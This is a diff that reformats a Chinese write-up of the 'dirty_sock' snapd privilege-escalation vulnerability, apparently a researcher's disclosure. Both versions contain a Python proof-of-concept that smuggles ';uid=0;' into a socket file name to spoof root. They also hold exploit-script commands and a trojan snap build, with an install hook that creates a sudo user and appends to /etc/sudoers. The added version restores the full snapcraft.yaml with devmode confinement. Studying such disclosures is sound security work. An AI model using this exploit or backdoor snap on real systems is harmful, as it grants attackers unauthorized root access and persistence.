@@ -1,91 +1,146 @@
-但调试信息中字符串末尾的`@`符号是什么？该符号源自何处？我们可以从`remoteAddr`这个变量名中找到线索。在调试器中探索一番后，我们可以看到golang标准库（`net.go`）会返回本地网络地址
-**以及** 远程地址，我们可以在调试会话中看到这些信息（`laddr`以及`raddr`）：
-    > net.(*conn).LocalAddr() /usr/lib/go-1.10/src/net/net.go:210 (PC: 0x77f65f)
-    ...
-    => 210:    func (c *conn) LocalAddr() Addr {
-    ...
-    (dlv) print c.fd
-    ...
-        laddr: net.Addr(*net.UnixAddr) *{
-            Name: "/run/snapd.socket",
-            Net: "unix",},
-        raddr: net.Addr(*net.UnixAddr) *{Name: "@", Net: "unix"},}
-远程地址会被设置为神秘的`@`符号。进一步阅读`man unix`帮助信息后，我们了解到这与“抽象命名空间（abstract
-namespace）”有关，用来绑定独立于文件系统的socket。命名空间中的socket开头为`null-byte`（空字节）字符，该字符在终端中通常会显示为`@`。
-我们可以创建绑定到我们可控文件名的socket，而不去依赖netcat所使用的抽象套接字命名空间。这样操作应该能影响我们想修改的字符串变量的部分数据，也就是前面显示的`raddr`变量。
-通过一些简单的python代码，我们可以创建包含`;uid=0;`字符串的文件名，然后将socket绑定到该文件，最后利用该socket连接到snapd
-API。
-漏洞利用POC代码片段如下：
-    ## Setting a socket name with the payload included
-    sockfile = "/tmp/sock;uid=0;"
-    ## Bind the socket
-    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-    client_sock.bind(sockfile)
-    ## Connect to the snap daemon
-    client_sock.connect('/run/snapd.socket')
-现在我们可以在调试器中，再次观察`remoteAddr`变量的值：
-    > github.com/snapcore/snapd/daemon.ucrednetGet()
-    ...
-    =>  41:        for _, token := range strings.Split(remoteAddr, ";") {
-    ...
-    (dlv) print remoteAddr
-    "pid=5275;uid=1000;socket=/run/snapd.socket;/tmp/sock;uid=0;"
-很好，这里我们成功注入了一个假的uid（`uid=0`），也就是root用户，在最后一次迭代处理中该字段会覆盖实际的uid值。这样我们就能够访问受包含的API函数。
-我们可以在调试器中继续该函数，验证uid是否会被设置为0。delve的输出结果如下：
-    > github.com/snapcore/snapd/daemon.ucrednetGet()
-    ...
-    =>  65:        return pid, uid, socket, err
-    ...
-    (dlv) print uid
-    0
-## 四、武器化
-###  版本1
-[dirty_sockv1](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py)利用的是“POST
-/v2/create-user”这个API函数。为了利用该漏洞，我们只需在[Ubuntu
-SSO](https://login.ubuntu.com/)上创建一个账户，然后将SSH公钥上传到账户目录中，接下来使用如下命令来利用漏洞（使用我们注册的邮箱和关联的SSH私钥）：
-    $ dirty_sockv1.py -u PI:EMAIL -k id_rsa
-这种利用方式非常可靠并且可以安全执行，现在我们已经可以获得root权限。
-当然这里我们需要能够访问互联网，目标主机也需要开放SSH服务，那么我们是否可以在更加受限的环境中利用漏洞呢？
-###  版本2
-[dirty_sockv2](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py)使用了“POST
-/v2/snaps”
-API来侧加载一个snap，该snap中包含一个bash脚本，可以添加一个本地用户。这种利用方式适用于没有运行SSH服务的目标系统，也适用于没有互联网连接的较新版Ubuntu。然而，这里的侧加载方式的确需要一些核心snap依赖，如果缺乏这些依赖，可能会触发snapd服务的更新操作。根据我的测试，我发现这种方式仍然有效，但只能使用
-**一次** 。
-snap本身运行在沙箱（sandbox）环境中，并且数字签名需要匹配主机已信任的公钥。然而我们可以使用处于开发模式（“devmode”）的snap来降低这些限制条件，这样snap就能像其他应用那样访问操作系统。
-此外snap还引入了“hooks”机制，其中“install hook”会在snap安装时运行，并且“install
-hook”可以是一个简单的shell脚本。如果snap配置为“devmode”，那么这个hook会在root上下文中运行。
-我创建了一个简单的snap，该snap没有其他功能，只是会在安装阶段执行的一个bash脚本。该脚本会运行如下命令：
-    useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
-    usermod -aG sudo dirty_sock
-    echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
-上面中的加密字符串实际上是`dirty_sock`文本经过Python的`crypt.crypt()`函数处理后的结果。
-创建该snap的具体命令如下所示，我们可以在开发主机（而非目标主机）上执行这些命令。snap创建完毕后，我们可以将其转换为base64文本，以便整合到完整的python利用代码中。
-    ## Install necessary tools
-    sudo apt install snapcraft -y
-    ## Make an empty directory to work with
-    cd /tmp
-    mkdir dirty_snap
-    cd dirty_snap
-    ## Initialize the directory as a snap project
-    snapcraft init
-    ## Set up the install hook
-    mkdir snap/hooks
-    touch snap/hooks/install
-    chmod a+x snap/hooks/install
-    ## Write the script we want to execute as root
-    cat > snap/hooks/install > /etc/sudoers
-    EOF
-    ## Configure the snap yaml file
-    cat > snap/snapcraft.yaml 
-经过base64编码的文本可以存放到`dirty_sock.py`利用代码开头处的`TROJAN_SNAP`全局变量中。
-利用程序使用python语言开发，会执行如下操作：
-1、创建一个随机文件，文件名中包含`;uid=0;`字符串
-2、将一个socket绑定到该文件
-3、连接到snapd API
-4、删除后门snap（如果上一次执行中断导致snap残留）
-5、安装后门snap
-6、删除后门snap
-7、删除临时socket文件
-8、漏洞利用成功
-## 五、防护及缓解措施
-请及时给系统打补丁，我披露漏洞后snapd团队第一时间就解决了这个问题。
+### 一、调试信息中的 `@` 符号
+
+在调试信息中，字符串末尾的 `@` 符号是什么？这个符号从何而来？我们可以从 `remoteAddr` 变量名中找到线索。通过在调试器中进行探索，我们发现 Golang 标准库（`net.go`）会返回本地网络地址以及远程地址，这些信息可以在调试会话中看到（`laddr` 和 `raddr`）。
+
+```go
+> net.(*conn).LocalAddr() /usr/lib/go-1.10/src/net/net.go:210 (PC: 0x77f65f)
+...
+=> 210:    func (c *conn) LocalAddr() Addr {
+...
+(dlv) print c.fd
+...
+    laddr: net.Addr(*net.UnixAddr) *{
+        Name: "/run/snapd.socket",
+        Net: "unix",},
+    raddr: net.Addr(*net.UnixAddr) *{Name: "@", Net: "unix"},}
+```
+
+远程地址被设置为神秘的 `@` 符号。进一步阅读 `man unix` 帮助文档后，我们了解到这与“抽象命名空间”有关，用于绑定独立于文件系统的 socket。命名空间中的 socket 以 `null-byte` 字符开头，该字符在终端中通常显示为 `@`。
+
+### 二、利用方法
+
+我们可以创建一个绑定到可控文件名的 socket，而不依赖于 netcat 所使用的抽象套接字命名空间。这样可以影响我们想要修改的字符串变量的部分数据，即前面显示的 `raddr` 变量。
+
+通过简单的 Python 代码，我们可以创建包含 `;uid=0;` 字符串的文件名，然后将 socket 绑定到该文件，并利用该 socket 连接到 snapd API。
+
+#### 漏洞利用 POC 代码片段：
+
+```python
+## 设置包含 payload 的 socket 名称
+sockfile = "/tmp/sock;uid=0;"
+## 绑定 socket
+client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+client_sock.bind(sockfile)
+## 连接到 snap 守护进程
+client_sock.connect('/run/snapd.socket')
+```
+
+现在我们可以在调试器中再次观察 `remoteAddr` 变量的值：
+
+```go
+> github.com/snapcore/snapd/daemon.ucrednetGet()
+...
+=>  41:        for _, token := range strings.Split(remoteAddr, ";") {
+...
+(dlv) print remoteAddr
+"pid=5275;uid=1000;socket=/run/snapd.socket;/tmp/sock;uid=0;"
+```
+
+成功注入了一个假的 `uid=0`，即 root 用户，在最后一次迭代处理中该字段会覆盖实际的 uid 值。这样我们就能够访问受保护的 API 函数。
+
+继续执行该函数并验证 uid 是否被设置为 0。delve 的输出结果如下：
+
+```go
+> github.com/snapcore/snapd/daemon.ucrednetGet()
+...
+=>  65:        return pid, uid, socket, err
+...
+(dlv) print uid
+0
+```
+
+### 三、武器化
+
+#### 版本 1
+
+[dirty_sockv1](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py) 利用的是 “POST /v2/create-user” API 函数。为了利用该漏洞，只需在 [Ubuntu SSO](https://login.ubuntu.com/) 上创建一个账户，上传 SSH 公钥，然后使用以下命令来利用漏洞（使用注册的邮箱和关联的 SSH 私钥）：
+
+```sh
+$ dirty_sockv1.py -u PI:EMAIL -k id_rsa
+```
+
+这种利用方式非常可靠且安全，可以获取 root 权限。当然，这里需要能够访问互联网，目标主机也需要开放 SSH 服务。那么，我们是否可以在更受限的环境中利用漏洞呢？
+
+#### 版本 2
+
+[dirty_sockv2](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py) 使用了 “POST /v2/snaps” API 来侧加载一个包含 bash 脚本的 snap，该脚本可以添加一个本地用户。这种方式适用于没有运行 SSH 服务的目标系统，也适用于没有互联网连接的较新版 Ubuntu。然而，侧加载方式需要一些核心 snap 依赖，如果缺乏这些依赖，可能会触发 snapd 服务的更新操作。根据测试，这种方式仍然有效，但只能使用一次。
+
+snap 本身运行在沙箱环境中，并且数字签名需要匹配主机已信任的公钥。然而，我们可以使用处于开发模式（“devmode”）的 snap 来降低这些限制条件，使 snap 能像其他应用那样访问操作系统。
+
+此外，snap 引入了“hooks”机制，其中“install hook”会在 snap 安装时运行，并且可以是一个简单的 shell 脚本。如果 snap 配置为“devmode”，那么这个 hook 会在 root 上下文中运行。
+
+我创建了一个简单的 snap，该 snap 在安装阶段执行一个 bash 脚本，运行以下命令：
+
+```sh
+useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
+usermod -aG sudo dirty_sock
+echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
+```
+
+上述加密字符串实际上是 `dirty_sock` 文本经过 Python 的 `crypt.crypt()` 函数处理后的结果。
+
+创建该 snap 的具体命令如下所示，我们可以在开发主机上执行这些命令。snap 创建完毕后，可以将其转换为 base64 文本，以便整合到完整的 python 利用代码中。
+
+```sh
+## 安装必要的工具
+sudo apt install snapcraft -y
+## 创建一个空目录
+cd /tmp
+mkdir dirty_snap
+cd dirty_snap
+## 初始化目录为 snap 项目
+snapcraft init
+## 设置 install hook
+mkdir snap/hooks
+touch snap/hooks/install
+chmod a+x snap/hooks/install
+## 写入要以 root 权限执行的脚本
+cat > snap/hooks/install << EOF
+useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
+usermod -aG sudo dirty_sock
+echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
+EOF
+## 配置 snap yaml 文件
+cat > snap/snapcraft.yaml << EOF
+name: dirty-snap
+version: '1.0'
+summary: A simple snap to add a user
+description: |
+  This snap adds a new user with sudo privileges.
+confinement: devmode
+
+apps:
+  dirty-snap:
+    command: echo "Installed"
+    plugs: [home]
+
+hooks:
+  install: snap/hooks/install
+EOF
+```
+
+经过 base64 编码的文本可以存放到 `dirty_sock.py` 利用代码开头处的 `TROJAN_SNAP` 全局变量中。
+
+利用程序使用 Python 语言开发，执行以下步骤：
+1. 创建一个随机文件，文件名中包含 `;uid=0;` 字符串。
+2. 将一个 socket 绑定到该文件。
+3. 连接到 snapd API。
+4. 删除后门 snap（如果上一次执行中断导致 snap 残留）。
+5. 安装后门 snap。
+6. 删除后门 snap。
+7. 删除临时 socket 文件。
+8. 漏洞利用成功。
+
+### 四、防护及缓解措施
+
+请及时给系统打补丁。我在披露漏洞后，snapd 团队第一时间就解决了这个问题。
